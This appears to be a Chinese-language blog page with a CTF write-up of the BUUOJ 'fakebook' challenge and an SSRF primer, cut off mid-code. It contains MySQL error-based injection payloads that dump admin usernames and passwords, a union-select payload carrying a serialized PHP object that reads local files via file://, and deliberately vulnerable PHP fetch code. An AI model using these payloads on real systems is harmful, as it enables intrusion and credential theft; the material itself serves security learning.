<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  

  
  <title>V&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="It is not ignorance and weakness but arrogance that destroys mankind">
<meta property="og:type" content="website">
<meta property="og:title" content="V&#39;s blog">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="V&#39;s blog">
<meta property="og:description" content="It is not ignorance and weakness but arrogance that destroys mankind">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="V&#39;s blog">
<meta name="twitter:description" content="It is not ignorance and weakness but arrogance that destroys mankind">
  
    <link rel="alternate" href="/atom.xml" title="V&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">V&#39;s blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">Daily life of a rookie</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-BUUOJ_SSRF" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/21/BUUOJ_SSRF/" class="article-date">
  <time datetime="2019-08-21T09:27:00.000Z" itemprop="datePublished">2019-08-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/21/BUUOJ_SSRF/">BUUOJ_SSRF</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="BUUOJ-SSRF"><a href="#BUUOJ-SSRF" class="headerlink" title="BUUOJ_SSRF"></a>BUUOJ_SSRF</h1><h2 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h2><p>wp参考：<a href="http://www.northity.com/2018/09/11/网鼎杯第一场WP/" target="_blank" rel="noopener">http://www.northity.com/2018/09/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BAWP/</a></p>
<p><strong>上来先扫，不会错的</strong><br>robots.txt 里有一个 user.php.bak<br>拿到源码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;name = $name;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;blog = $blog;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $ch = curl_init();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_URL, $url);</span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span></span><br><span class="line"><span class="php">        $output = curl_exec($ch);</span></span><br><span class="line"><span class="php">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="number">404</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        curl_close($ch);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $output;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $blog = <span class="keyword">$this</span>-&gt;blog;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>

<p>get函数可以ssrf<br>乱翻了一下站点，发现 view.php?no=* 可以sql注入，据说sqlmap直接跑，但是我好像版本有点问题，没跑出来</p>
<p>可以报错注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">no=1 and updatexml(1,make_set(3,'~',(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">view.php?<span class="keyword">no</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">make_set</span>(<span class="number">3</span>,<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"users"</span>)),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">view.php?<span class="keyword">no</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">make_set</span>(<span class="number">3</span>,<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">data</span> <span class="keyword">from</span> <span class="keyword">users</span>)),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">group_concat</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、功能：将<span class="keyword">group</span> <span class="keyword">by</span>产生的同一个分组中的值连接起来，返回一个字符串结果。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、语法：<span class="keyword">group_concat</span>( [<span class="keyword">distinct</span>] 要连接的字段 [<span class="keyword">order</span> <span class="keyword">by</span> 排序字段 <span class="keyword">asc</span>/<span class="keyword">desc</span> ] [separator <span class="string">'分隔符'</span>] )</span><br><span class="line"></span><br><span class="line">说明：通过使用<span class="keyword">distinct</span>可以排除重复值；如果希望对结果中的值进行排序，可以使用<span class="keyword">order</span> <span class="keyword">by</span>子句；separator是一个字符串值，缺省为一个逗号。</span><br></pre></td></tr></table></figure>

<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>1、通过floor报错,注入语句如下:<br> and select 1 from (select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);</p>
<p>2、通过ExtractValue报错,注入语句如下:<br> and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p>
<p>3、通过UpdateXml报错,注入语句如下:<br> and 1=(updatexml(1,concat(0x3a,(select user())),1))</p>
<p>4、通过NAME_CONST报错,注入语句如下:<br> and exists(select<em>from (select</em>from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</p>
<p>5、通过join报错,注入语句如下:<br> select * from(select * from mysql.user ajoin mysql.user b)c;</p>
<p>6、通过exp报错,注入语句如下:<br> and exp(~(select * from (select user () ) a) );</p>
<p>7、通过GeometryCollection()报错,注入语句如下:<br> and GeometryCollection(()select *from(select user () )a)b );</p>
<p>8、通过polygon ()报错,注入语句如下:<br> and polygon (()select * from(select user ())a)b );</p>
<p>9、通过multipoint ()报错,注入语句如下:<br> and multipoint (()select * from(select user() )a)b );</p>
<p>10、通过multlinestring ()报错,注入语句如下:<br> and multlinestring (()select * from(selectuser () )a)b );</p>
<p>11、通过multpolygon ()报错,注入语句如下:<br> and multpolygon (()select * from(selectuser () )a)b );</p>
<p>12、通过linestring ()报错,注入语句如下:<br> and linestring (()select * from(select user() )a)b );</p>
<h4 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">爆数据库版本信息：?id=<span class="number">1</span> and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT @@version),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"> 链接用户：?id=<span class="number">1</span> and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT user()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"> 链接数据库：?id=<span class="number">1</span> and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"> 爆库：?id=<span class="number">1</span> and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT distinct concat(<span class="number">0x7e</span>, (select schema_name),<span class="number">0x7e</span>) FROM admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"> 爆表：?id=<span class="number">1</span> and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT distinct concat(<span class="number">0x7e</span>, (select table_name),<span class="number">0x7e</span>) FROM admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"> 爆字段：?id=<span class="number">1</span> and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT distinct concat(<span class="number">0x7e</span>, (select column_name),<span class="number">0x7e</span>) FROM admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"> 爆字段内容：?id=<span class="number">1</span> and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT distinct concat(<span class="number">0x23</span>,username,<span class="number">0x3a</span>,password,<span class="number">0x23</span>) FROM admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h5 id="updatexml-函数"><a href="#updatexml-函数" class="headerlink" title="updatexml () 函数"></a>updatexml () 函数</h5><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(XML<span class="number">_</span>document, XPath<span class="number">_</span>string, <span class="keyword">new</span><span class="number">_</span><span class="keyword">value</span>);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>XML_document</td>
<td>String格式，为XML文档对象的名称，文中为Doc</td>
</tr>
<tr>
<td>XPath_string</td>
<td>Xpath格式的字符串</td>
</tr>
<tr>
<td>new_value</td>
<td>String格式，替换查找到的符合条件的数据</td>
</tr>
</tbody></table>
<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">SELECT</span> user()),<span class="number">0</span>x7e),<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出用户</p>
<p>0x7eASCII码,实为~,upadtexml()报错信息为特殊字符、字母及之后的内容,为了前面字母丢失,开头连接一个特殊字符~ eg: <img src="/2019/08/21/BUUOJ_SSRF/ce3a426fcb9ce1ff2260d49ed3e234a0-1566356566934.png" alt="img"></p>
<h5 id="运用"><a href="#运用" class="headerlink" title="运用"></a>运用</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">关键词 DISTINCT 用于返回唯一不同的值。</span><br><span class="line"></span><br><span class="line">爆库</span><br><span class="line">http://www.hackblog.cn/sql.php?id=1 and updatexml(1,concat(0x7e,(<span class="keyword">SELECT</span> <span class="keyword">distinct</span> <span class="keyword">concat</span>(<span class="number">0x7e</span>, (<span class="keyword">select</span> schema_name),<span class="number">0x7e</span>) <span class="keyword">FROM</span> <span class="keyword">admin</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">爆表</span><br><span class="line"><span class="keyword">http</span>://www.hackblog.cn/sql.php?<span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">distinct</span> <span class="keyword">concat</span>(<span class="number">0x7e</span>, (<span class="keyword">select</span> table_name),<span class="number">0x7e</span>) <span class="keyword">FROM</span> <span class="keyword">admin</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">爆字段内容</span><br><span class="line"><span class="keyword">http</span>://www.hackblog.cn/sql.php?<span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">distinct</span> <span class="keyword">concat</span>(<span class="number">0x23</span>,username,<span class="number">0x3a</span>,<span class="keyword">password</span>,<span class="number">0x23</span>) <span class="keyword">FROM</span> <span class="keyword">admin</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h5 id="简单绕过"><a href="#简单绕过" class="headerlink" title="简单绕过"></a>简单绕过</h5><p>如:concat等常见的字符串拼接函数被过滤时,我们可以使用冷门的字符串处理函数绕过</p>
<h6 id="make-set"><a href="#make-set" class="headerlink" title="make_set()"></a>make_set()</h6><p>make_set()用法</p>
<p>payload</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(<span class="number">1</span>,make_set(<span class="number">3</span>,<span class="number">0</span>x7e,(<span class="name">select</span> user())),<span class="number">1</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>其他<br>类似的函数：lpad()、reverse()、repeat()、export_set()（lpad()、reverse()、repeat()这三个函数使用的前提是所查询的值中，必须至少含有一个特殊字符，否则会漏掉一些数据）。</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,lpad('@',30,(select user())),1);</span><br><span class="line"><span class="keyword">ERROR </span>1105 (HY000): XPATH syntax error: '@localhostroot@localhostr@'</span><br><span class="line"></span><br><span class="line">mysql&gt; select updatexml(1,repeat((select user()),2),1);</span><br><span class="line"><span class="keyword">ERROR </span>1105 (HY000): XPATH syntax error: '@localhostroot@localhost'</span><br><span class="line"></span><br><span class="line">mysql&gt; select updatexml(1,(select user()),1);</span><br><span class="line"><span class="keyword">ERROR </span>1105 (HY000): XPATH syntax error: '@localhost'</span><br><span class="line"></span><br><span class="line">mysql&gt; select updatexml(1,reverse((select user())),1);</span><br><span class="line"><span class="keyword">ERROR </span>1105 (HY000): XPATH syntax error: '@toor'</span><br><span class="line"></span><br><span class="line">mysql&gt; select updatexml(1,export_set(1|2,'::',(select user())),1);</span><br><span class="line"><span class="keyword">ERROR </span>1105 (HY000): XPATH syntax error: '::,::,root@localhost,root@localh'</span><br></pre></td></tr></table></figure>

<p>回到题目：</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">1</span>|<span class="selector-tag">qwer</span>|<span class="selector-tag">d404559f602eab6fd602ac7680dacbfaadd13630335e951f097af3900e9de176b6db28512f2e000b9d04fba5133e8b1c6e8df59db3a8ab9d60be4b97cc9e81db</span>|<span class="selector-tag">O</span><span class="selector-pseudo">:8</span><span class="selector-pseudo">:"UserInfo"</span><span class="selector-pseudo">:3</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"name"</span>;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"qwer"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"age"</span>;<span class="attribute">i</span>:<span class="number">22</span>;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"blog"</span>;<span class="attribute">s</span>:<span class="number">13</span>:<span class="string">"www.baidu.com"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>看到库里有这种东西<br>明显的一个反序列化+ssrf了(当然这句话是老大写在文档上的)<br>用 union select 构造读取地址，可以读到 /etc/passwd，试着去读 flag.php，getflag<br>最终payload</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/view.php?no=<span class="number">0</span> <span class="class"><span class="keyword">union</span>/**/<span class="title">select</span> 1,2,3,'<span class="title">O</span>:8:"<span class="title">UserInfo</span>":3:&#123;<span class="title">s</span>:4:"<span class="title">name</span>";</span><span class="symbol">s:</span><span class="number">4</span>:<span class="string">"aaaa"</span>;<span class="symbol">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="symbol">i:</span><span class="number">66</span>;<span class="symbol">s:</span><span class="number">4</span>:<span class="string">"blog"</span>;<span class="symbol">s:</span><span class="number">29</span>:<span class="string">"file:///var/www/html/flag.php"</span>;&#125;<span class="string">'</span></span><br></pre></td></tr></table></figure>

<p>都出来的东西在图片的base64中</p>
<p>用union select去执行ssrf，新姿势get</p>
<h2 id="SSRF基础"><a href="#SSRF基础" class="headerlink" title="SSRF基础"></a>SSRF基础</h2><p>来源：<a href="http://www.northity.com/2019/03/13/SSRF基础/" target="_blank" rel="noopener">http://www.northity.com/2019/03/13/SSRF%E5%9F%BA%E7%A1%80/</a></p>
<p>SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。</p>
<p>漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p>
<h3 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h3><p>攻击者可以利用 SSRF 实现的攻击主要有 5 种：</p>
<ul>
<li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li>
<li>攻击运行在内网或本地的应用程序（比如溢出）</li>
<li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现</li>
<li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）</li>
<li>利用 file 协议读取本地文件等</li>
</ul>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><ul>
<li>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li>
<li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</li>
<li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</li>
<li>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</li>
<li>文件处理，编码处理，属性信息处理（ffpmg,ImagemMaic,DOCX,PDF,XML处理器）</li>
</ul>
<p>最后一点是猪猪侠提的，个人感觉是将xxe中发起请求的点也划分到了ssrf中来<br>确实也没有什么问题，能发起网络请求的地方，都可能存在SSRF漏洞，只是xxe相对进阶一点，可以循环解析，存在带外的方式</p>
<h3 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h3><p>以php为例<br><code>file_get_contents()</code>【url】</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123; </span></span><br><span class="line"><span class="php">    $content = file_get_contents($_POST[<span class="string">'url'</span>]); </span></span><br><span class="line"><span class="php">    $filename =<span class="string">'./images/'</span>.rand().<span class="string">';img1.jpg'</span>; </span></span><br><span class="line"><span class="php">    file_put_contents($filename, $content); </span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $_POST[<span class="string">'url'</span>]; </span></span><br><span class="line"><span class="php">    $img = <span class="string">"&lt;img src=\""</span>.$filename.<span class="string">"\"/&gt;"</span>; </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $img;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>fsockopen()【host，port，link】</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span><span class="params">($host,$port,$link)</span> </span>&#123; </span></span><br><span class="line"><span class="php">    $fp = fsockopen($host, intval($port), $errno, $errstr, <span class="number">30</span>); </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (!$fp) &#123; </span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"$errstr (error number $errno) \n"</span>; </span></span><br><span class="line"><span class="php">    &#125; <span class="keyword">else</span> &#123; </span></span><br><span class="line"><span class="php">        $out = <span class="string">"GET $link HTTP/1.1\r\n"</span>; </span></span><br><span class="line"><span class="php">        $out .= <span class="string">"Host: $host\r\n"</span>; </span></span><br><span class="line"><span class="php">        $out .= <span class="string">"Connection: Close\r\n\r\n"</span>; </span></span><br><span class="line"><span class="php">        $out .= <span class="string">"\r\n"</span>; </span></span><br><span class="line"><span class="php">        fwrite($fp, $out); </span></span><br><span class="line"><span class="php">        $contents=<span class="string">''</span>; </span></span><br><span class="line"><span class="php">        <span class="keyword">while</span> (!feof($fp)) &#123; </span></span><br><span class="line"><span class="php">            $contents.= fgets($fp, <span class="number">1024</span>); </span></span><br><span class="line"><span class="php">        &#125; </span></span><br><span class="line"><span class="php">        fclose($fp); </span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $contents; </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<h4 id="php-fsockopen使用"><a href="#php-fsockopen使用" class="headerlink" title="php fsockopen使用"></a>php fsockopen使用</h4><p><strong>函数说明：</strong>fsockopen — 打开一个网络连接或者一个Unix套接字连接</p>
<p><strong>语法：</strong></p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resource fsockopen  ( <span class="keyword">string</span> $hostname  [, <span class="keyword">int</span> $port  = <span class="number">-1</span>  [, <span class="keyword">int</span> &amp;$errno  [, <span class="keyword">string</span> &amp;$errstr  [, <span class="keyword">float</span> $timeout  = ini_get(<span class="string">"default_socket_timeout"</span>)  ]]]] )</span><br></pre></td></tr></table></figure>

<p><strong>参数：</strong></p>
<ol>
<li>hostname 如果安装了OpenSSL，那么你也许应该在你的主机名地址前面添加访问协议ssl://或者是tls://，从而可以使用基于TCP/IP协议的SSL或者TLS的客户端连接到远程主机。 </li>
<li>port 端口号。如果对该参数传一个-1，则表示不使用端口，例如unix://。 </li>
<li>errno 如果errno的返回值为0，而且这个函数的返回值为 FALSE ，那么这表明该错误发生在套接字连接（connect()）调用之前，导致连接失败的原因最大的可能是初始化套接字的时候发生了错误。 </li>
<li>errstr 错误信息将以字符串的信息返回。 </li>
<li>timeout 设置连接的时限，单位为秒。</li>
</ol>
<p>curl_exec()【url】</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span></span><br><span class="line"><span class="php">    $link = $_POST[<span class="string">'url'</span>];</span></span><br><span class="line"><span class="php">    $curlobj = curl_init();</span></span><br><span class="line"><span class="php">    curl_setopt($curlobj, CURLOPT_POST, <span class="number">0</span>);</span></span><br><span class="line"><span class="php">    curl_setopt($curlobj,CURLOPT_URL,$link);</span></span><br><span class="line"><span class="php">    